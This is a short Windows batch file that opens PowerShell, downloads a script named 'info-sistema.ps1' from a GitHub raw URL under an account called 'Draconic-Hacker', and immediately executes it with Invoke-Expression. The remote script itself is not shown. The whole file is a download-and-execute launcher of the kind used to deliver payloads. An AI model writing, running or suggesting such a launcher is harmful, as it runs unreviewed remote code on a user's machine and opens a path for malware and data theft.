@echo off
set "COMMIT=a637490"

start powershell -noexit -command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Draconic-Hacker/interface_ps1/%COMMIT%/info-sistema.ps1' -UseBasicParsing).Content"